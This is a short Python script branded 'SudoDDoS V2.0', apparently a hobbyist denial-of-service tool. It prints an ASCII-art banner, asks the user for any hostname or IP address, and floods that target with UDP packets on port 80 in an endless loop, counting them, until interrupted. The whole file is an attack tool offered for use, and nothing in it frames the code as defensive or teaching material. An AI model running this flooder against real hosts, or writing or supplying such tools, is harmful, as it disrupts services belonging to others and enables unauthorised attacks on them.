import socket
import pyfiglet
import time

sudo = pyfiglet.figlet_format("SudoDDoS V2.0", font = "standard")
print(sudo)
print ("AUTHOR - MR SUDO")
print ("----------------")
time.sleep(2.0)

def send_data_packets(hostname):
    # Initialize the socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Counter variable to keep track of packets sent
    packets_sent = 0

    # Continuously send data packets
    while True:
        try:
            # Send packets to the specified hostname and port
            sock.sendto(b"Data Packet", (hostname, 80))
            packets_sent += 1
            print(f"Sent packet: {packets_sent}")

        except KeyboardInterrupt:
            # Stop the program if ctrl + c is pressed
            break

        except Exception as e:
            # Handle network errors if any
            print(f"Error occurred: {e}")

    # Close the socket and print the total packets sent
    sock.close()
    print(f"\nTotal packets sent: {packets_sent}")

# Get the hostname from the user
hostname = input("Enter the hostname or IP address to send data packets: ")

# Call the function to start sending packets
send_data_packets(hostname)
